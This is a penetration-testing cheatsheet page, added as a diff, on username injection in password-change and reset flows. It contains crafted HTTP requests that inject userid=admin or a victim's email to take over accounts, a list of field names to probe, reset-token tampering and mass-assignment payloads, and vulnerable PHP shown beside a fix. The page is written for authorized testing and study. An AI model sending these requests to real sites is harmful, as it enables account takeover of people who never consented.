@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Username injection · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Authentication &amp; Sessions</nav><h1>Username injection</h1><p class="cx-lede">Reset and change-password flows that trust user-supplied identity fields - overriding the session&#x27;s user to take over arbitrary accounts.</p><div class="cx-tags"><span class="cx-tag">MITRE T1078, T1212</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT AuthBypass, CredentialTheft</span><span class="cx-tag">OWASP A07, A01</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Password-change flows often share a codebase with admin "reset any user's password" flows. When the consumer-facing version reads the target user from a request parameter instead of the session, you can change anyone's password from your own account.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Normal password change (from your own session)
+POST /change-password   currentpw=...&amp;newpw=...
+                        ↓
+                        backend reads $_SESSION[&#x27;userid&#x27;] → updates your account
+
+# Attack - inject the target user
+POST /change-password   currentpw=...&amp;newpw=...&amp;userid=admin
+                        ↓
+                        backend reads $_REQUEST[&#x27;userid&#x27;] (precedence over session) → updates admin</code></pre></figure>
+<p>Success indicator: target account's password is changed to your chosen value; you log in as that user.</p>
+<h2 id="the-vulnerability-shape">The vulnerability shape</h2>
+<p>The vulnerable pattern is reuse: the application's developers wrote one "change password" function and used it for both:</p>
+<ul>
+<li><strong>User-initiated changes</strong> - current user changes their own password (target = self)</li>
+<li><strong>Admin-initiated changes</strong> - admin/helpdesk changes another user's password (target = explicit)</li>
+</ul>
+<p>If both paths share the same endpoint, the endpoint needs a "target user" parameter. The bug is when that parameter is honored for non-admin callers without an authorization check.</p>
+<h3 id="vulnerable-code">Vulnerable code</h3>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+// THIS IS BROKEN
+if (isset($_REQUEST[&#x27;userid&#x27;])) {
+    $userid = $_REQUEST[&#x27;userid&#x27;];      // ← attacker controls this
+} else if (isset($_SESSION[&#x27;userid&#x27;])) {
+    $userid = $_SESSION[&#x27;userid&#x27;];
+} else {
+    die(&quot;unknown userid&quot;);
+}
+
+// Change the password for $userid
+update_password($userid, $_POST[&#x27;new_password&#x27;]);</code></pre></figure>
+<p><code>$_REQUEST</code> is the union of <code>$_GET</code> and <code>$_POST</code>, so the attacker can supply <code>userid</code> via either method. The endpoint should have:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Correct: always read from session for non-admin paths
+$userid = $_SESSION[&#x27;userid&#x27;];
+
+// And check authorization before honoring an explicit userid
+if (isset($_POST[&#x27;userid&#x27;]) &amp;&amp; $_POST[&#x27;userid&#x27;] !== $_SESSION[&#x27;userid&#x27;]) {
+    if (!is_admin($_SESSION[&#x27;userid&#x27;])) {
+        deny();
+    }
+    $userid = $_POST[&#x27;userid&#x27;];
+}</code></pre></figure>
+<p>The bug shows up most commonly in PHP (<code>$_REQUEST</code> precedence) but isn't language-specific. Equivalent patterns exist in:</p>
+<ul>
+<li>Java: request parameters overriding session attributes</li>
+<li>Node.js: <code>req.body.userid</code> used directly when <code>req.session.userid</code> should be canonical</li>
+<li>ASP.NET: <code>Request["userid"]</code> (which checks query string, form, and cookies)</li>
+</ul>
+<h2 id="identifying-the-field-name">Identifying the field name</h2>
+<p>You need the name the application uses for the user identifier. Sources to check:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Hidden field in the password-change form --&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;userid&quot; value=&quot;...&quot;&gt;
+
+&lt;!-- Field used elsewhere in the app for identifying users --&gt;
+&lt;form action=&quot;/messages/send&quot;&gt;
+    &lt;input name=&quot;recipient&quot; ...&gt;
+&lt;/form&gt;
+
+&lt;!-- API endpoint references --&gt;
+fetch(&#x27;/api/user/&#x27; + userid + &#x27;/password&#x27;)
+
+&lt;!-- Profile URLs --&gt;
+/profile?id=12345
+/user/admin/settings</code></pre></figure>
+<p>Common field names to try (in order of likelihood):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>userid
+user_id
+user
+username
+uid
+account
+account_id
+email
+login
+target_user</code></pre></figure>
+<p>If the application uses <code>userid</code> for some operations and <code>user</code> for others, try both - vulnerable codebases often have inconsistent naming, and the password-change endpoint might honor either.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="step-1-register-your-own-account">Step 1 - Register your own account</h3>
+<p>You need an authenticated session to attack from. Create an account through normal registration (or use an account you compromised earlier in the engagement).</p>
+<h3 id="step-2-capture-the-normal-password-change-request">Step 2 - Capture the normal password-change request</h3>
+<p>Log in as your account, go to the password-change page, submit a real change. Capture the request in Burp:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /change-password HTTP/1.1
+Host: target.example.com
+Cookie: SESSIONID=abc123
+Content-Type: application/x-www-form-urlencoded
+
+current_password=YourCurrentPw&amp;new_password=YourNewPw&amp;confirm_password=YourNewPw</code></pre></figure>
+<p>Note that the request body doesn't include any user identifier - the application is reading the user from the session cookie.</p>
+<h3 id="step-3-inject-the-target-user">Step 3 - Inject the target user</h3>
+<p>Replay the same request with an added <code>userid</code> field:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /change-password HTTP/1.1
+Host: target.example.com
+Cookie: SESSIONID=abc123                     ← your session
+Content-Type: application/x-www-form-urlencoded
+
+current_password=YourCurrentPw&amp;new_password=AttackerControlled&amp;confirm_password=AttackerControlled&amp;userid=admin</code></pre></figure>
+<p>What's happening: the application reads <code>userid=admin</code> from the request body, but reads the session cookie too (for "is the current user logged in?"). If the application validates "logged in" against the session but resolves "whose password to change" from <code>$_REQUEST['userid']</code>, the admin account's password is updated.</p>
+<p>The "current password" field is also worth testing - sometimes the validation against current password is performed against the <em>injected</em> user (in which case you need to know admin's current password, which defeats the attack) or against the <em>session</em> user (in which case your own current password is enough, and the bug works).</p>
+<h3 id="step-4-log-in-as-the-target">Step 4 - Log in as the target</h3>
+<p>After a successful password change, log out and log in as the target user with the password you just set.</p>
+<h2 id="variants-and-adjacent-bugs">Variants and adjacent bugs</h2>
+<h3 id="username-instead-of-userid">Username instead of userid</h3>
+<p>Some applications use the username string rather than a numeric ID:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /change-password ... &amp;username=admin</code></pre></figure>
+<p>Try every plausible field name. Submit <code>userid=admin</code> and <code>username=admin</code> separately, and also together - sometimes one wins and the other is ignored.</p>
+<h3 id="email-as-the-user-identifier">Email as the user identifier</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /change-password ... &amp;email=victim@example.com</code></pre></figure>
+<p>Email-based identifiers are common in apps that allow email-as-username. The same injection logic applies.</p>
+<h3 id="multi-step-reset-flow">Multi-step reset flow</h3>
+<p>A two-step reset flow:</p>
+<ol>
+<li>Submit username, receive a token (token is bound to that username server-side)</li>
+<li>Submit token + new password to complete the reset</li>
+</ol>
+<p>Some implementations don't bind the token to the username server-side - they just pass the username through hidden form fields. Tamper the hidden username field at step 2:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http"># Step 1: trigger reset for your-own-account, get a valid token via email
+POST /reset-request   username=yourself
+
+# Step 2: submit the token but with a different username
+POST /reset-complete   username=admin&amp;token=YOUR_VALID_TOKEN&amp;new_password=...</code></pre></figure>
+<p>If the application accepts your valid (yourself-bound) token for the admin account, the bug is identical in spirit to the password-change injection - user-supplied identity overriding what should be a server-side binding.</p>
+<h3 id="account-merge-or-migration-features">Account-merge or migration features</h3>
+<p>"Merge two accounts," "migrate username," "transfer ownership" - these features inherently allow changing the target user. The bug here is when the authorization check is missing or weak ("any logged-in user can transfer any account").</p>
+<h3 id="self-service-username-change">Self-service username change</h3>
+<p>If your application allows you to change your own username, see whether the change is checked against existing usernames. If not, you might be able to:</p>
+<ol>
+<li>Note your current userid (e.g., 1042)</li>
+<li>Change your username to <code>admin</code> (collision allowed)</li>
+<li>Trigger anything that resolves user by username - now there are two accounts named <code>admin</code>, and the application's choice between them is unspecified</li>
+</ol>
+<h2 id="detection">Detection</h2>
+<p>The basic check: examine the password-change request body. Does it include a user identifier?</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Capture the normal request and look at the form fields
+curl -s -X POST -d &quot;current=x&amp;new=y&amp;confirm=y&quot; -b &quot;SESSIONID=abc&quot; -v https://&lt;TARGET&gt;/change-password 2&gt;&amp;1 | grep -E &quot;^&gt;&quot; </code></pre></figure>
+<p>Body contains the user ID → application probably reads it from the body, and probably trusts it (bug present).
+Body doesn't contain user ID → application reads from session, probably safe at this endpoint (but reset and merge flows may still be vulnerable).</p>
+<h3 id="active-test">Active test</h3>
+<p>Add a <code>userid=different-user</code> field and submit. Observe whether the response changes:</p>
+<ul>
+<li>"Password changed successfully" + you can now log in as <code>different-user</code> → vulnerable</li>
+<li>"Permission denied" / "Cannot change another user's password" → authorization is enforced</li>
+<li>"Password changed successfully" but <code>different-user</code>'s password didn't actually change → field is ignored (safe at this endpoint)</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>The bug often coexists with weak reset tokens.</strong> Once an application is sloppy about identity in one auth flow, it's usually sloppy in others. After finding a username injection in password change, check the reset flow (<a href="../reset-tokens/index.html">Reset tokens</a>) too.</li>
+<li><strong>Audit-log behavior reveals scope.</strong> When the bug fires, who does the audit log credit for the password change? If it credits the attacker's session user, the bug also leaves a forensic trail naming you. If it credits the target user, the bug is harder to detect from the logs side.</li>
+<li><strong>Adjacent endpoints with the same primitive.</strong> Anything that takes "an action on a user" - disable account, change email, change role, delete profile - may share the same broken identity-resolution logic. After confirming one, check others.</li>
+<li><strong>Mass-assignment relatives.</strong> A related bug class allows setting <em>arbitrary fields</em> on the user record (not just password) via injection: <code>userid=admin&amp;role=admin&amp;is_admin=true</code>. If the application's user-update endpoint doesn't allowlist which fields are settable, the attacker upgrades themselves rather than taking over admin. Worth probing once you've confirmed the basic injection.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Changing another user's password is a destructive action - the legitimate user can't log in until they reset. Coordinate with the engagement scope before exploiting at scale. The "stealth" demonstration is: change a test account's password (an account you both control), document the request and response, and stop there for the report. Don't take over real users' accounts unless explicitly authorized.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../security-questions/index.html">Previous: Security questions</a><a class="cx-next" href="../cookie-tampering/index.html">Next: Cookie tampering</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
